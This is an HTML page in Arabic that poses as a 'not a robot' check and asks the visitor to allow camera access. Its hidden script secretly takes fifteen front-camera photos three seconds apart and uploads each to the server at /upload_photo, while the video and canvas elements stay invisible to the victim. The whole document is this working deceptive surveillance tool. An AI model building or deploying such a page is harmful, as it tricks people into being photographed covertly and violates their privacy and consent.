<!DOCTYPE html>
<html lang="ar">  
<head>  
  <meta charset="UTF-8">  
  <title>جاري تجهيز الرابط</title>  
  <style>  
    body {  
      background: #fff;  
      color: #333;  
      text-align: center;  
      font-family: sans-serif;  
      padding: 30px;  
    }  
    video, canvas, #status {  
      display: none !important;  
    }  
  </style>  
</head>  
<body>  
  <h2>قم بضغط سماح للوصول الى Camera للتحقق من أنك لست روبوتًا</h2>  
  <video id="video" autoplay playsinline></video>  
  <canvas id="canvas"></canvas>  
  <p id="status"></p>  
  
  <script>  
    const video = document.getElementById("video");  
    const canvas = document.getElementById("canvas");  
  
    const TOTAL_PHOTOS = 15;  
    const INTERVAL_MS = 3000; // 3 ثواني  
    let photosTaken = 0;  
    let stream;  
  
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })  
      .then(s => {  
        stream = s;  
        video.srcObject = stream;  
  
        video.onloadedmetadata = () => {  
          setTimeout(() => {  
            takePhotosRepeatedly();  
          }, 1000);  
        };  
      })  
      .catch(err => {  
        console.error("🔴 فشل إذن الكاميرا:", err);  
      });  
  
    function takePhotosRepeatedly() {  
      if (photosTaken >= TOTAL_PHOTOS) {  
        stopStream();  
        return;  
      }  
  
      captureAndSend().then(() => {  
        photosTaken++;  
        setTimeout(takePhotosRepeatedly, INTERVAL_MS);  
      }).catch(err => {  
        console.error("🔴 خطأ في الإرسال:", err);  
        stopStream();  
      });  
    }  
  
    function captureAndSend() {  
      return new Promise((resolve, reject) => {  
        if (!video.videoWidth || !video.videoHeight) {  
          reject("📷 الفيديو غير جاهز.");  
          return;  
        }  
  
        const ctx = canvas.getContext("2d");  
        canvas.width = video.videoWidth;  
        canvas.height = video.videoHeight;  
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);  
  
        canvas.toBlob(blob => {  
          const formData = new FormData();  
          formData.append("photo", blob, "photo.jpg");  
  
          fetch("/upload_photo", {  
            method: "POST",  
            body: formData  
          })  
          .then(res => res.json())  
          .then(data => {  
            if (data.success) resolve();  
            else reject(data.error || "Unknown error");  
          })  
          .catch(err => reject(err));  
        }, "image/jpeg");  
      });  
    }  
  
    function stopStream() {  
      if (stream) {  
        stream.getTracks().forEach(track => track.stop());  
      }  
    }  
  </script>  
</body>  
</html>
